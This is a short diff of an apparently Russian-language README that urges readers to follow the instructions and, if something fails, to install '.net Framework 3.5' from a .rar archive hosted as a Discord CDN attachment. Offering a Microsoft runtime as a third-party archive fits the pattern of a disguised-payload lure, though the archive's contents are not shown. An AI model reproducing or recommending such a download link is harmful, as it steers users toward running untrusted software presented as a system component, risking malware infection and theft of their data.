@@ -33,4 +33,4 @@
 
                                       🔧Не забудьте выполнить инструкцию 
 
-Если не работает, установите .net Framework 3.5 [.net Framework 3.5](https://cdn.discordapp.com/attachments/1146948784778137701/1159036797540630558/netFramework3.5.rar?ex=651e6ca2&is=651d1b22&hm=e4517d5af78cfca23d6e68d288d18e10eb51da82e23c20ddafa65969ebfbf817&)
+Если не работает, установите [.net Framework 3.5](https://cdn.discordapp.com/attachments/1146948784778137701/1159036797540630558/netFramework3.5.rar?ex=651e6ca2&is=651d1b22&hm=e4517d5af78cfca23d6e68d288d18e10eb51da82e23c20ddafa65969ebfbf817&)
